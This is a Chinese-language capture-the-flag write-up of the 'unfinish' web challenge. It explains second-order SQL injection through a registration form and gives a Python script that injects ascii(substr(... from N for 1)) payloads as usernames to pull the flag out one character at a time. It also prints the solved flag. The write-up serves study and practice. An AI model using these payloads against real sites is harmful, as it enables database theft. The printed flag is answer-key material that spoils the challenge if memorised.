# unfinish

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=c3c9c12c-ce2f-48bb-a781-78fba4695a94_2)

突然发现我对sql一窍不通。

进来是一个登陆界面，疯狂猜闭合无果。看了[wp](https://www.cnblogs.com/zhengna/p/13595290.html)才知道注入点不在这，需要用御剑这类扫描工具扫描网页，得知还有个register.php。这题的关键在于知道注入点是[二次注入](https://zhuanlan.zhihu.com/p/39917830)。文章里讲得很清楚了，放到这道题里来看就是后台代码在注册时使用了转义之类的函数，比如addslashes，会在类似'"这种特殊字符前面添加\符号进行转义。因此在注册时不会有任何问题。

问题在于addslashes函数在当时进行转义后，插入数据库的还是原来的恶意数据。比如' select database() #这个payload，经过addslashes转义后得到\' select database() #(不太确定#会不会被转义，意会一下)，那注册时没啥问题。但是后期读取用户名时得到的却是' select database() #，单引号会起作用，形成二次注入。

联系这道题。先注册一个test用户，登录时输入邮箱和密码。登陆成功后可以找到用户名。如果我们在用户名上动点手脚，使登陆后显示的用户名是数据库里我们想要的数据，flag不就可以出来了吗？注册界面很有可能使用了addslashes进行转义，所以注册时不会报错；但是插入用户名时直接使用了恶意数据，导致二次注入。

可以开始想payload了。先在注册界面测试一下有没有过滤。经测试information，逗号(,)等比较重要的常用项都被过滤了。substr需要逗号，不过可以用from to替代，参考这篇[文章](https://www.jianshu.com/p/d10785d22db2)。information是获取表名的必须项，被过滤就没办法了，可以猜表名，一般是flag。

```python
import requests
def getFlag():
    flag = ''
    for i in range(40):
        data_flag = {
            'username':"ascii(substr((select * from flag) from "+str(i+1)+" for 1))+'",
            'password':'admin',
            "email":"admin32@admin.com"+str(i)
        }
        requests.post("http://61.147.171.105:50915//register.php",data_flag)
        login_data={
            'password':'admin',
            "email":"admin32@admin.com"+str(i)
        }
        response=requests.post("http://61.147.171.105:50915//login.php",login_data)
        html=response.text
        username=html.split('</span>')[0][-20:].strip()
        if int(username)==0:
            break
        flag+=chr(int(username))
    print(flag)
getFlag()
```

数据库不用看了，表名没法知道，那就直接搞flag吧。有两种方法可以考虑。一种是像上面这样一次猜一个字符，第二种是select * from flag后将内容二次编码为hex，因为一次编码hex中有字母，而sql遇见字母后会截断，两次hex就不会有字母了。还要把二次hex的内容以12的长度使用substr进行分割，因为超过12就会用科学计数法表示。

不知道为啥我这个脚本去buuctf就跑不出来了，因此我又找了个[wp](https://blog.csdn.net/rfrder/article/details/109352385)，进一步加深记忆（废物啊！）

## Flag
  > flag{2494e4bf06734c39be2e1626f757ba4c}